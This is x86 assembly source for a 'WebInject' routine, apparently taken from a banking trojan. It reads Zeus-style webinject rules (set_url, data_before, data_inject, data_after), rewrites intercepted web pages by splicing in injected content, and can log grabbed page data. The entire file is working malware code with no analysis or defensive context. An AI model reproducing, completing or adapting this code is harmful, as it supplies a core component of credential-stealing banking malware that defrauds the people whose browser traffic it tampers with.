
.code

;; ==================================================================================================== ;;
;; WebInject -                                                                                          ;;
;; __in dwHandle   - stored connection handle                                                           ;;
;; __in lpPageBuff - pointer to buffer with page for inject (len in first dword)                        ;;
;; ==================================================================================================== ;;
WebInject proc dwHandle, lpPageBuff : dword
	local  lpInjPtr : dword
	local  lpOptLen : dword
	local  lpInjEnd : dword
	local  lpInjEOF : dword
	local  lpDataBeforePtr : dword
	local  dwDataBeforeLen : dword
	local  lpDataInjectPtr : dword
	local  dwDataInjectLen : dword
	local  lpDataAfterPtr  : dword
	local  dwDataAfterLen  : dword



	pushad
	mov  eax, lpWebInjectsData[ebx]
	jmpz eax, @ret		;; webinjects data not exist
	mov  ecx, [eax]		;; webinjects len
	add  eax, 4
	add  ecx, eax
	mov  lpInjPtr, eax	;; webinject begin ptr
	mov  lpInjEOF, ecx	;; webinjects end ptr


@NextInject:
	invokx  &GetInject[ebx], dwHandle, lpInjPtr
	jmpz eax, @ret		;; no more webinjects for this connection
	mov  lpInjPtr, eax	;; current webinject ptr (ptr to options)
	mov  lpOptLen, ecx	;; options len


	mov  eax, lpInjEOF
	sub  eax, lpInjPtr
	invokx  &StrIPos[ebx], lpInjPtr, eax, "\r\nset_url ", 10
	jmpnz eax, @F
	mov  eax, lpInjEOF
@@:	mov  lpInjEnd, eax	;; webinject end ptr


;; ================================================== ;;

	mov  eax, lpInjPtr
	mov  lpDataBeforePtr, eax
	mov  lpDataInjectPtr, eax
	mov  lpDataAfterPtr, eax


@NextSubInj:
	mov  eax, lpInjEnd
	sub  eax, lpDataBeforePtr
	invokx  &StrIPos[ebx], lpDataBeforePtr, eax, "\r\ndata_before\r\n", 15
	jmpz eax, @NextInject		;; data_before not found inside this inject
	add  eax, 15
	mov  lpDataBeforePtr, eax

	dec  eax
	mov  ecx, lpInjEnd
	sub  ecx, eax
	invokx  &StrIPos[ebx], eax, ecx, "\r\ndata_end\r\n", 12
	jmpz eax, @NextInject		;; data_end not found inside this inject
	sub  eax, lpDataBeforePtr
	jge  @F
	xor  eax, eax
@@:	mov  dwDataBeforeLen, eax


	mov  eax, lpInjEnd
	sub  eax, lpDataInjectPtr
	invokx  &StrIPos[ebx], lpDataInjectPtr, eax, "\r\ndata_inject\r\n", 15
	jmpz eax, @NextInject		;; data_inject not found inside this inject
	add  eax, 15
	mov  lpDataInjectPtr, eax

	dec  eax
	mov  ecx, lpInjEnd
	sub  ecx, eax
	invokx  &StrIPos[ebx], eax, ecx, "\r\ndata_end\r\n", 12
	jmpz eax, @NextInject		;; data_end not found inside this inject
	sub  eax, lpDataInjectPtr
	jge  @F
	xor  eax, eax
@@:	mov  dwDataInjectLen, eax


	mov  eax, lpInjEnd
	sub  eax, lpDataAfterPtr
	invokx  &StrIPos[ebx], lpDataAfterPtr, eax, "\r\ndata_after\r\n", 14
	jmpz eax, @NextInject		;; data_after not found inside this inject
	add  eax, 14
	mov  lpDataAfterPtr, eax

	dec  eax
	mov  ecx, lpInjEnd
	sub  ecx, eax
	invokx  &StrIPos[ebx], eax, ecx, "\r\ndata_end\r\n", 12
	jmpz eax, @NextInject		;; data_end not found inside this inject
	sub  eax, lpDataAfterPtr
	jge  @F
	xor  eax, eax
@@:	mov  dwDataAfterLen, eax


;; ================================================== ;;

	mov  esi, lpPageBuff
	mov  ecx, [esi]		;; page len
	add  esi, 4			;; page start
	lea  edi, [esi+ecx]	;; page end


	cmp  dwDataBeforeLen, 0
	je   @F
	invokx  &StrIPosEx[ebx], esi, ecx, lpDataBeforePtr, dwDataBeforeLen
	jmpz eax, @NextSubInj	;; data_before not found inside this page
	mov  esi, ecx		;; ptr to data_inject place begin


@@:	mov  edx, esi		;; ptr to data_inject place end, or...
	cmp  dwDataAfterLen, 0
	je   @F
	mov  eax, edi
	sub  eax, esi
	invokx  &StrIPosEx[ebx], esi, eax, lpDataAfterPtr, dwDataAfterLen
	jmpz eax, @NextSubInj	;; data_after not found inside this page
	mov  edx, eax		;; ptr to data_inject place end


@@:	xor  eax, eax
	.if  dwDataAfterLen == eax
		.if dwDataInjectLen == eax
			mov  edi, esi
		.endif
	.else
		.if dwDataInjectLen != eax
			.if dwDataBeforeLen == eax
				mov  esi, edx
			.endif
		.endif
	.endif


;; ================================================== ;;

	invokx  &StrIPos[ebx], lpInjPtr, lpOptLen, "L", 1
	jmpz eax, @shift


	mov  eax, edx
	sub  eax, esi
	jmpz eax, @shift
	invokx  &InLog[ebx], esi, eax, INJECT_GRABBED


	jmp  @NextSubInj


;; ================================================== ;;
@shift:
	;; shift data
	mov  eax, esi
	add  eax, dwDataInjectLen
	cmp  eax, edx
	je   @F				;; shift not need
	mov  ecx, edi
	sub  ecx, edx		;; data len
	lea  edi, [eax+ecx]	;; new page end
	invokx  &strcpyn[ebx], eax, edx, ecx


	;; inject
@@:	cmp  dwDataInjectLen, 0
	je   @F		;; inject not need
	invokx  &strcpyn[ebx], esi, lpDataInjectPtr, dwDataInjectLen


@@:	mov  esi, lpPageBuff
	sub  edi, esi
	sub  edi, 4			;; page len
	mov  [esi], edi		;; set new len


	jmp  @NextSubInj


@ret:
	popad
	ret
WebInject endp

